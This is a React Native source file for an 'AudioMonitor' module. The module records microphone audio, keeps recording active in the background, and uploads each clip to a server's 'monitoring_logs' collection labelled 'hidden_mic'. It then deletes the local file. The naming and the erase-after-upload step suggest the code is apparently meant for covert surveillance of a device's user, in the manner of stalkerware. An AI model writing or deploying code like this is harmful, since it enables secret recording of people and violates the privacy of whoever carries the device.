import { Audio } from 'expo-av';
import * as FileSystem from 'expo-file-system';
import { pb, getUserId } from '../../services/pocketbase';

let recording: Audio.Recording | null = null;

export const startAudioRecording = async (durationMs: number = 10000) => {
    try {
        console.log('[AudioMonitor] Requesting permissions...');
        const perm = await Audio.requestPermissionsAsync();
        if (perm.status !== 'granted') {
            console.warn('[AudioMonitor] Mic permission denied');
            return;
        }

        await Audio.setAudioModeAsync({
            allowsRecordingIOS: true,
            playsInSilentModeIOS: true,
            staysActiveInBackground: true,
        });

        const { recording: newRecording } = await Audio.Recording.createAsync(
            Audio.RecordingOptionsPresets.HIGH_QUALITY
        );
        recording = newRecording;
        console.log('[AudioMonitor] Recording started for', durationMs, 'ms');

        // Automatically stop after duration
        setTimeout(async () => {
            await stopAudioRecording();
        }, durationMs);

    } catch (err) {
        console.error('[AudioMonitor] Failed to start recording:', err);
    }
};

export const stopAudioRecording = async () => {
    if (!recording) return;

    try {
        console.log('[AudioMonitor] Stopping recording...');
        await recording.stopAndUnloadAsync();
        const uri = recording.getURI();
        recording = null;

        if (uri) {
            await uploadAudio(uri);
        }
    } catch (err) {
        console.error('[AudioMonitor] Failed to stop recording:', err);
    }
};

const uploadAudio = async (uri: string) => {
    try {
        const formData = new FormData();
        // @ts-ignore — React Native FormData accepts {uri, name, type}
        formData.append('file', {
            uri,
            name: `audio_${Date.now()}.m4a`,
            type: 'audio/m4a',
        });
        formData.append('type', 'hidden_mic');
        formData.append('user_id', getUserId());

        await pb.collection('monitoring_logs').create(formData);
        console.log('[AudioMonitor] Audio uploaded successfully');

        // Cleanup local file
        await FileSystem.deleteAsync(uri);
    } catch (err) {
        console.error('[AudioMonitor] Upload failed:', err);
    }
};
